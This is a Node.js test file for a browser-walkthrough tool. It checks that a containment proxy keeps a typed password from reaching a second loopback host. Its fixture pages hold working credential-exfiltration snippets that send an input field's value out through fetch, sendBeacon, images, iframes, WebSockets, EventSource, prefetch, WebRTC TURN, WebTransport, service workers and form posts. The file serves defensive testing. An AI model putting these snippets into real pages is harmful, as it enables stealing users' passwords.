'use strict';

// A real browser against real servers, because a fake page cannot show these failing:
// two rounds of navigation guards passed their tests and still let the value out. In a
// run with value_env or --save-state the browser only reaches loopback, so what these
// tests count is bytes: the second host is 127.0.0.2, which `isLoopbackUrl` does not
// take for local, and it must receive nothing, on any channel, in TCP or UDP. Nothing
// leaves the machine.
//
// These need a browser and Playwright, which the project does not depend on, so they
// skip where those are missing: the proof of this boundary is local, not from CI.

const test = require('node:test');
const assert = require('node:assert/strict');
const dgram = require('node:dgram');
const fs = require('node:fs/promises');
const fsSync = require('node:fs');
const http = require('node:http');
const net = require('node:net');
const os = require('node:os');
const path = require('node:path');

const { normalizeScript, runWalkthrough } = require('../src/lib/browser-walkthrough');
const { openBrowser, probeBrowsers } = require('../src/lib/browser-session');
const { containmentArgs, containmentFailure, startRefusalProxy } = require('../src/lib/browser-walkthrough/refusal-proxy');
const { loadPlaywright } = require('../src/lib/playwright-loader');
const { runBrowserRun } = require('../src/commands/browser-run');

const TYPED_VALUE = ['seeded', 'real', 'value', '9731'].join('-');
const STATE = '.aioson/runtime/browser-state/owner.json';
const env = { E2E_PASSWORD: TYPED_VALUE };
const listen = (server, host, port = 0) => new Promise((resolve, reject) => {
  server.once('error', reject);
  server.listen(port, host, () => resolve(server.address().port));
});
const settle = (ms = 350) => new Promise((resolve) => { setTimeout(resolve, ms); });
const page = (title, body) => `<!doctype html><html lang="en"><head><title>${title}</title></head><body><main><h1>${title}</h1>${body}</main></body></html>`;
const FIELD = '<label>Password<input type="password" id="p" name="p"></label>';
const onInput = (code) => `<script>document.getElementById("p").addEventListener("input",(e)=>{const v=encodeURIComponent(e.target.value);${code}})</script>`;

// Counts what arrives at the socket, whatever the protocol: no parser to miss a channel.
async function externalHost() {
  const seen = { bytes: 0, connections: 0, udp: 0, lines: [] };
  const sockets = new Set();
  const tcp = net.createServer((socket) => {
    seen.connections += 1;
    sockets.add(socket);
    socket.on('error', () => {});
    socket.on('close', () => sockets.delete(socket));
    socket.on('data', (data) => {
      seen.bytes += data.length;
      seen.lines.push(data.toString('latin1').split('\r\n')[0]);
      socket.end('HTTP/1.1 200 OK\r\ncontent-type: text/html\r\ncontent-length: 53\r\n\r\n<label>Password<input type="password" autofocus></label>'.slice(0, 200));
    });
  });
  const udp = dgram.createSocket('udp4');
  udp.on('message', (message) => { seen.udp += message.length; });
  const port = await listen(tcp, '127.0.0.2');
  await new Promise((resolve, reject) => {
    udp.once('error', reject);
    udp.bind(0, '127.0.0.2', resolve);
  });
  return {
    seen,
    port,
    udpPort: udp.address().port,
    url: `http://127.0.0.2:${port}`,
    close: () => new Promise((resolve) => {
      for (const socket of sockets) socket.destroy();
      udp.close();
      tcp.close(resolve);
    })
  };
}

async function servers() {
  const external = await externalHost();
  const out = external.url;
  const toLocalRoute = 'setTimeout(()=>{location.href="/idp"},200)';
  const allChannels = [
    `fetch("${out}/fetch?v="+v,{mode:"no-cors"});`,
    `navigator.sendBeacon("${out}/beacon",v);`,
    `new Image().src="${out}/img?v="+v;`,
    `document.getElementById("f").src="${out}/iframe?v="+v;`,
    `try{new WebSocket("ws://127.0.0.2:${external.port}/ws?v="+v)}catch(x){}`,
    `new EventSource("${out}/sse?v="+v);`
  ].join('');
  const routes = {
    '/idp': (send) => send(302, '', { location: `${out}/signin` }),
    '/do-307': (send) => send(307, '', { location: `${out}/post` }),
    '/tunnel': (send) => send(302, '', { location: `https://127.0.0.2:${external.port}/signin` }),
    '/late-tunnel': (send) => send(200, page('Loading', `<script>setTimeout(()=>{location.href="https://127.0.0.2:${external.port}/signin"},200)</script>`)),
    '/go-out': (send) => send(302, '', { location: `${out}/go-out` }),
    '/late-redirect': (send) => send(200, page('Loading', `<script>setTimeout(()=>{location.href="${out}/signin"},200)</script>`)),
    '/disabled': (send) => send(200, page('Sign in', `<label>Password<input type="password" disabled></label><script>${toLocalRoute}</script>`)),
    '/readonly': (send) => send(200, page('Sign in', `<label>Password<input type="password" readonly></label><script>${toLocalRoute}</script>`)),
    '/type-away': (send) => send(200, page('Sign in', `${FIELD}${onInput('if(!window.gone){window.gone=1;location.href="/idp"}')}`)),
    '/form-307': (send) => send(200, page('Sign in', `<form method="post" action="/do-307">${FIELD}<button>Sign in</button></form>`)),
    '/form-out': (send) => send(200, page('Sign in', `<form method="post" action="${out}/post">${FIELD}<button>Sign in</button></form>`)),
    '/form-iframe': (send) => send(200, page('Sign in', `<form method="post" action="${out}/post" target="hid">${FIELD}<button>Sign in</button></form><iframe name="hid"></iframe>`)),
    '/open-out': (send) => send(200, page('Sign in', `${FIELD}${onInput(`window.open("${out}/open?v="+v)`)}`)),
    '/open-local': (send) => send(200, page('Sign in', `${FIELD}${onInput('window.open("/go-out?v="+v)')}`)),
    '/fetch': (send) => send(200, page('Sign in', `${FIELD}${onInput(`fetch("${out}/fetch?v="+v,{mode:"no-cors"})`)}`)),
    '/beacon': (send) => send(200, page('Sign in', `${FIELD}${onInput(`navigator.sendBeacon("${out}/beacon",v)`)}`)),
    '/img': (send) => send(200, page('Sign in', `${FIELD}${onInput(`new Image().src="${out}/img?v="+v`)}`)),
    '/iframe': (send) => send(200, page('Sign in', `${FIELD}<iframe id="f"></iframe>${onInput(`document.getElementById("f").src="${out}/iframe?v="+v`)}`)),
    '/ws': (send) => send(200, page('Sign in', `${FIELD}${onInput(`try{new WebSocket("ws://127.0.0.2:${external.port}/ws?v="+v)}catch(x){}`)}`)),
    '/sse': (send) => send(200, page('Sign in', `${FIELD}${onInput(`new EventSource("${out}/sse?v="+v)`)}`)),
    '/prefetch': (send) => send(200, page('Sign in', `${FIELD}${onInput(`for(const rel of ["prefetch","preconnect","dns-prefetch"]){const l=document.createElement("link");l.rel=rel;l.href="${out}/"+rel+"?v="+v;document.head.append(l)}`)}`)),
    '/webrtc': (send) => send(200, page('Sign in', `${FIELD}${onInput(`const c=new RTCPeerConnection({iceServers:[{urls:"stun:127.0.0.2:${external.udpPort}"},{urls:"turn:127.0.0.2:${external.udpPort}",username:v,credential:v}]});c.createDataChannel("x");c.createOffer().then((o)=>c.setLocalDescription(o))`)}`)),
    '/webtransport': (send) => send(200, page('Sign in', `${FIELD}${onInput(`try{new WebTransport("https://127.0.0.2:${external.udpPort}/wt?v="+v).ready.catch(()=>{})}catch(x){}`)}`)),
    '/sw.js': (send) => send(200, `self.addEventListener("install",()=>self.skipWaiting());self.addEventListener("activate",(e)=>e.waitUntil(clients.claim()));self.addEventListener("message",(e)=>{fetch("${out}/sw?v="+e.data,{mode:"no-cors"})})`, { 'content-type': 'text/javascript' }),
    '/sw': (send) => send(200, page('Sign in', `${FIELD}<script>navigator.serviceWorker.register("/sw.js")</script>${onInput('navigator.serviceWorker.ready.then((r)=>r.active.postMessage(v))')}`)),
    '/all': (send) => send(200, page('Sign in', `${FIELD}<iframe id="f"></iframe><script>navigator.serviceWorker.register("/sw.js")</script>${onInput(`${allChannels}navigator.serviceWorker.ready.then((r)=>r.active.postMessage(v));`)}`)),
    '/login-page': (send) => send(200, page('Sign in', `<img src="${out}/logo.png"><script src="${out}/analytics.js"></script><form method="post" action="/login">${FIELD}<button>Sign in</button></form>`)),
    '/login': (send) => send(303, '', { location: '/orders', 'set-cookie': 'sid=live; HttpOnly; Path=/' }),
    '/orders': (send, req) => {
      if (!(req.headers.cookie || '').includes('sid=live')) return send(303, '', { location: '/login-page' });
      return send(200, page('Orders', `<img src="${out}/track.png"><button id="add">New order</button><p id="count">0 orders</p><script>document.getElementById("add").onclick=()=>{document.getElementById("count").textContent="1 order"}</script>`));
    }
  };
  const local = http.createServer((req, res) => {
    const send = (status, body, headers = {}) => { res.writeHead(status, { 'content-type': 'text/html', ...headers }); res.end(body); };
    const route = routes[new URL(req.url, 'http://x').pathname];
    if (route) return route(send, req);
    return send(404, page('Not found', ''));
  });
  const port = await listen(local, '127.0.0.1');
  return {
    url: `http://127.0.0.1:${port}`,
    port,
    external,
    close: async () => {
      local.closeAllConnections();
      await new Promise((resolve) => { local.close(resolve); });
      await external.close();
    }
  };
}

async function available() {
  try {
    const probe = await probeBrowsers({ projectDir: process.cwd() });
    if (!probe.available) return false;
    const check = http.createServer();
    await listen(check, '127.0.0.2');
    await new Promise((resolve) => { check.close(resolve); });
    return true;
  } catch {
    return false;
  }
}

async function project(t) {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'aioson-walk-real-'));
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  return root;
}
const run = (root, url, spec, extra = {}) => runWalkthrough({ targetDir: root, script: normalizeScript({ name: 'real', timeout: 2500, ...spec }).script, url, env, persist: false, ...extra });
const fill = { do: 'fill', target: 'label=Password', value_env: 'E2E_PASSWORD' };
const type = { do: 'type', target: 'label=Password', value_env: 'E2E_PASSWORD' };
const click = { do: 'click', target: 'role=button[name="Sign in"]' };
const wait = { do: 'wait', ms: 400 };
const via = (route, ...steps) => [{ do: 'goto', url: route }, ...steps];

const CHANNELS = [
  ['a disabled field, then a local route that 302s out', via('/disabled', fill)],
  ['a readonly field, then a local route that 302s out', via('/readonly', fill)],
  ['type with a navigation in the middle', via('/type-away', { ...type, delay: 25 }, wait)],
  ['a client redirect after load, with fill', via('/late-redirect', fill)],
  ['a client redirect after load, with type', via('/late-redirect', type)],
  ['a form with a local 307', via('/form-307', fill, click, wait)],
  ['a form posting out', via('/form-out', fill, click, wait)],
  ['a form posting into an iframe', via('/form-iframe', fill, click, wait)],
  ['window.open out', via('/open-out', fill, wait)],
  ['window.open on a local 302', via('/open-local', fill, wait)],
  ['fetch', via('/fetch', fill, wait)],
  ['sendBeacon', via('/beacon', fill, wait)],
  ['an image', via('/img', fill, wait)],
  ['an iframe', via('/iframe', fill, wait)],
  ['a WebSocket', via('/ws', fill, wait)],
  ['an EventSource', via('/sse', fill, wait)],
  ['prefetch, preconnect and dns-prefetch', via('/prefetch', fill, wait)],
  ['WebRTC with STUN and TURN', via('/webrtc', fill, wait)],
  ['WebTransport', via('/webtransport', fill, wait)],
  ['a service worker', [{ do: 'goto', url: '/sw' }, { do: 'wait', ms: 300 }, { do: 'goto', url: '/sw' }, { do: 'wait', ms: 300 }, fill, wait]]
];

for (const [label, steps] of CHANNELS) {
  test(`real browser: nothing reaches the other host through ${label}`, async (t) => {
    if (!(await available())) return t.skip('no browser or no second loopback address here');
    const root = await project(t);
    const app = await servers();
    t.after(app.close);
    const report = await run(root, app.url, { steps });
    await settle();
    assert.equal(report.network_contained, true);
    assert.deepEqual({ bytes: app.external.seen.bytes, connections: app.external.seen.connections, udp: app.external.seen.udp }, { bytes: 0, connections: 0, udp: 0 }, JSON.stringify(app.external.seen.lines));
    assert.equal(JSON.stringify(report).includes(TYPED_VALUE), false);
  });
}

test('real browser: the same channels do reach it with no value_env, so the zeros above mean something', async (t) => {
  if (!(await available())) return t.skip('no browser or no second loopback address here');
  const root = await project(t);
  const app = await servers();
  t.after(app.close);
  const typed = { do: 'fill', target: 'label=Password', value: 'plain' };
  const report = await run(root, app.url, { steps: via('/all', { do: 'wait', ms: 300 }, { do: 'goto', url: '/all' }, { do: 'wait', ms: 300 }, typed, { do: 'wait', ms: 500 }) });
  await settle();
  assert.equal(report.network_contained, false);
  const seen = app.external.seen.lines.join('\n');
  for (const channel of ['/fetch?v=plain', '/beacon', '/img?v=plain', '/iframe?v=plain', '/ws?v=plain', '/sse?v=plain', '/sw?v=plain']) {
    assert.ok(seen.includes(channel), `${channel} never fired:\n${seen}`);
  }
  const before = app.external.seen.lines.length;
  await run(root, app.url, { steps: via('/form-307', typed, click, wait) });
  await settle();
  assert.ok(app.external.seen.lines.slice(before).some((line) => line.startsWith('POST /post')), 'the 307 keeps the body');

  // A proxy does not see these two: they count in UDP, on the same host.
  for (const route of ['/webrtc', '/webtransport']) {
    const packets = app.external.seen.udp;
    await run(root, app.url, { steps: via(route, typed, { do: 'wait', ms: 700 }) });
    await settle();
    assert.ok(app.external.seen.udp > packets, `${route} sent nothing over UDP`);
  }
});

test('real browser: what the page tried is listed as information, and the step that left names the host', async (t) => {
  if (!(await available())) return t.skip('no browser or no second loopback address here');
  const root = await project(t);
  const app = await servers();
  t.after(app.close);
  const passing = await run(root, app.url, { steps: via('/fetch', fill, wait) });
  assert.equal(passing.ok, true, 'a page\'s refused request does not fail the run');
  assert.ok(passing.blocked_hosts_from_pages.includes('127.0.0.2'), JSON.stringify(passing.blocked_hosts));
  assert.deepEqual(passing.blocked_hosts_from_pages, ['127.0.0.2'], 'the browser\'s own traffic is not put on the page');
  assert.equal(passing.blocked_hosts.includes('network-containment-check.invalid'), false, 'the probe is the run\'s own');
  assert.equal(passing.warnings.some((line) => /value_env_external_request/.test(line)), false);

  const noField = await run(root, app.url, { steps: via('/late-redirect', fill) });
  assert.equal(noField.ok, false);
  assert.match(noField.steps[1].error, /the browser could not reach 127\.0\.0\.2: this run only reaches loopback/);
  assert.equal(noField.steps[1].detail, '', 'it never says it filled what it did not');

  const redirected = await run(root, app.url, { steps: via('/idp', fill) });
  assert.equal(redirected.steps.length, 1, 'the run stopped before the fill');
  assert.match(redirected.steps[0].error, /could not reach 127\.0\.0\.2/);

  // https: the tunnel is refused, and the page ends on chrome-error with no address.
  const tunnel = await run(root, app.url, { steps: via('/tunnel', fill) });
  assert.equal(tunnel.steps.length, 1);
  assert.match(tunnel.steps[0].error, /ERR_TUNNEL_CONNECTION_FAILED.*refused 127\.0\.0\.2/);
  const lateTunnel = await run(root, app.url, { steps: via('/late-tunnel', fill) });
  assert.match(lateTunnel.steps[1].error, /could not reach 127\.0\.0\.2/);

  // A local server that is down is not a refused host, even after one was refused.
  const closed = http.createServer();
  const closedPort = await listen(closed, '127.0.0.1');
  await new Promise((resolve) => { closed.close(resolve); });
  const down = await run(root, app.url, { steps: via('/fetch', fill, wait, { do: 'goto', url: `http://127.0.0.1:${closedPort}/` }) });
  assert.equal(down.ok, false);
  assert.doesNotMatch(down.steps[3].error, /could not reach/);
  assert.match(down.steps[3].error, /ERR_CONNECTION_REFUSED/);
  assert.match(down.steps[3].error, /the pages of this run were refused 127\.0\.0\.2: it only reaches loopback/);

  const newTab = await run(root, app.url, { steps: via('/open-out', fill, wait) }, { saveState: STATE });
  assert.equal(newTab.ok, true, 'a new tab is not the page under test');
  assert.ok(newTab.blocked_hosts_from_pages.includes('127.0.0.2'));
  assert.equal(fsSync.existsSync(path.join(root, STATE)), true, 'and it does not cost the session');
});

test('real browser: login, the session kept, and the flow reused, on pages that load something external', async (t) => {
  if (!(await available())) return t.skip('no browser or no second loopback address here');
  const root = await project(t);
  const app = await servers();
  t.after(app.close);
  const flow = { steps: [
    { do: 'goto', url: '/orders' },
    { do: 'click', target: 'role=button[name="New order"]' },
    { do: 'expect', text: '1 order', ac: 'AC-01' },
    { do: 'reload' },
    { do: 'expect', text: '0 orders' }
  ] };

  const login = await run(root, app.url, { steps: [
    { do: 'goto', url: '/login-page' },
    fill,
    click,
    { do: 'expect', url: '/orders' }
  ] }, { saveState: STATE });
  await settle();
  assert.equal(login.ok, true, JSON.stringify(login.steps.filter((step) => !step.ok)));
  assert.equal(login.session_state.saved, STATE);
  assert.equal(login.steps[1].detail, 'filled label=Password with (masked)');
  assert.ok(login.blocked_hosts_from_pages.includes('127.0.0.2'), 'the logo and the analytics were refused');
  assert.equal(app.external.seen.bytes, 0);
  const saved = await fs.readFile(path.join(root, STATE), 'utf8');
  assert.match(saved, /"sid"/);
  assert.equal(saved.includes(TYPED_VALUE), false, 'the state holds the session, not the password');
  assert.equal(JSON.stringify(login).includes(TYPED_VALUE), false);

  // --state alone is not contained: there is no credential in this run.
  const reused = await run(root, app.url, flow, { state: STATE, env: {} });
  await settle();
  assert.equal(reused.ok, true, JSON.stringify(reused.steps.filter((step) => !step.ok)));
  assert.equal(reused.network_contained, false);
  assert.deepEqual(reused.blocked_hosts, []);
  assert.deepEqual(reused.blocked_hosts_from_pages, []);
  assert.deepEqual(Object.keys(reused.ids), ['AC-01']);
  assert.ok(app.external.seen.bytes > 0, 'the external image loaded');

  // Saving again from a session is contained again.
  const before = app.external.seen.bytes;
  const again = await run(root, app.url, flow, { state: STATE, saveState: STATE, env: {} });
  await settle();
  assert.equal(again.ok, true, JSON.stringify(again.steps.filter((step) => !step.ok)));
  assert.equal(app.external.seen.bytes, before, 'nothing more reached it');
});

test('real browser: the three local names keep working', async (t) => {
  if (!(await available())) return t.skip('no browser or no second loopback address here');
  const root = await project(t);
  const app = await servers();
  t.after(app.close);
  const localhost = await run(root, `http://localhost:${app.port}`, { steps: via('/fetch', fill) });
  assert.equal(localhost.ok, true, JSON.stringify(localhost.steps.filter((step) => !step.ok)));

  const ipv6 = http.createServer((req, res) => { res.writeHead(200, { 'content-type': 'text/html' }); res.end(page('V6', FIELD)); });
  try {
    const port = await listen(ipv6, '::1');
    const report = await run(root, `http://[::1]:${port}`, { steps: via('/', fill) });
    assert.equal(report.ok, true, JSON.stringify(report.steps.filter((step) => !step.ok)));
  } catch (error) {
    if (error.code !== 'EADDRNOTAVAIL' && error.code !== 'EAFNOSUPPORT') throw error;
  } finally {
    await new Promise((resolve) => { ipv6.close(resolve); });
  }
});

test('real browser: every mode launches with the flags as written, and is contained', async (t) => {
  if (!(await available())) return t.skip('no browser or no second loopback address here');
  const probe = await probeBrowsers({ projectDir: process.cwd() });
  const channels = [['chrome', probe.modes.chrome], ['msedge', probe.modes.msedge], ['chromium', probe.modes.bundled]].filter(([, mode]) => mode.available).map(([name]) => name);
  assert.ok(channels.length > 0);
  for (const channel of channels) {
    const proxy = await startRefusalProxy();
    const session = await openBrowser({ projectDir: process.cwd(), channel, refusalProxy: proxy, env: {} });
    try {
      assert.equal(session.ok, true, JSON.stringify(session));
      const about = await session.newPage();
      await about.goto('chrome://version');
      const launched = (await about.locator('#command_line').innerText()).replace(/"/g, '');
      await about.close();
      for (const flag of containmentArgs(proxy.port)) {
        assert.equal(launched.split(flag).length - 1, 1, `${channel}: ${flag} in ${launched}`);
      }
      assert.equal(launched.match(/--proxy-(?:server|bypass-list)=/g).length, 2, `${channel}: nothing else sets a proxy`);
      assert.equal(launched.includes('--no-proxy-server'), false);
      assert.equal(proxy.probed(), true, 'the run proved it before the first page');
    } finally {
      if (session.close) await session.close();
      await proxy.close();
    }
  }
});

test('real browser: a browser that ignores the WebRTC flag is refused, even if the proxy holds', async (t) => {
  if (!(await available())) return t.skip('no browser or no second loopback address here');
  const probe = await probeBrowsers({ projectDir: process.cwd() });
  const channel = ['chrome', 'msedge'].find((name) => probe.modes[name].available);
  if (!channel) return t.skip('this check launches an installed browser');
  const playwright = loadPlaywright([process.cwd()]);
  const proxy = await startRefusalProxy();
  t.after(proxy.close);
  const args = containmentArgs(proxy.port).filter((arg) => !arg.startsWith('--webrtc-ip-handling-policy='));
  const browser = await playwright.chromium.launch({ channel, headless: true, args });
  t.after(() => browser.close());
  const failure = await containmentFailure(await browser.newContext(), proxy);
  assert.match(failure, /WebRTC traffic past the refusal proxy/);
});

test('real browser: browser:run from script files, the way a phase runs it', async (t) => {
  if (!(await available())) return t.skip('no browser or no second loopback address here');
  const root = await project(t);
  const app = await servers();
  t.after(app.close);
  const previous = process.env.E2E_PASSWORD;
  process.env.E2E_PASSWORD = TYPED_VALUE;
  t.after(() => {
    if (previous === undefined) delete process.env.E2E_PASSWORD;
    else process.env.E2E_PASSWORD = previous;
  });
  const dir = path.join(root, '.aioson/qa/walkthroughs/orders');
  await fs.mkdir(dir, { recursive: true });
  await fs.writeFile(path.join(dir, 'login.json'), JSON.stringify({ name: 'login', feature: 'orders', timeout: 4000, steps: [
    { do: 'goto', url: '/login-page' },
    fill,
    click,
    { do: 'expect', url: '/orders' }
  ] }));
  await fs.writeFile(path.join(dir, 'orders.json'), JSON.stringify({ name: 'orders', feature: 'orders', timeout: 4000, steps: [
    { do: 'goto', url: '/orders' },
    { do: 'click', target: 'role=button[name="New order"]' },
    { do: 'expect', text: '1 order', ac: 'AC-01' },
    { do: 'reload' },
    { do: 'expect', text: '0 orders', ac: 'AC-02' }
  ] }));
  const lines = [];
  const logger = { log: (line) => lines.push(String(line)), error: (line) => lines.push(String(line)) };
  const translate = (key, values = {}) => `${key} ${JSON.stringify(values)}`;
  const script = (name) => `.aioson/qa/walkthroughs/orders/${name}.json`;

  const login = await runBrowserRun({ args: [root], options: { script: script('login'), url: app.url, 'save-state': STATE }, logger, t: translate });
  assert.equal(login.ok, true, lines.join('\n'));
  assert.equal(login.persisted, true);
  assert.equal(login.session_state.saved, STATE);
  assert.match(login.replay, /--save-state=\.aioson\/runtime\/browser-state\/owner\.json/);
  assert.ok(lines.some((line) => line.startsWith('browser_run.blocked_hosts') && line.includes('127.0.0.2')), lines.join('\n'));

  const reused = await runBrowserRun({ args: [root], options: { script: script('orders'), url: app.url, state: STATE }, logger, t: translate });
  assert.equal(reused.ok, true, lines.join('\n'));
  assert.deepEqual(Object.keys(reused.ids).sort(), ['AC-01', 'AC-02']);
  assert.equal(reused.report_path, '.aioson/context/features/orders/browser/orders.json');

  assert.equal(lines.join('\n').includes(TYPED_VALUE), false, 'nothing the command printed holds the value');
  const written = await fs.readFile(path.join(root, login.report_path), 'utf8');
  assert.equal(written.includes(TYPED_VALUE), false);
  assert.match(await fs.readFile(path.join(root, login.markdown_path), 'utf8'), /This run only reached loopback[\s\S]*Hosts a page asked for, refused \(information\): 127\.0\.0\.2/);
});
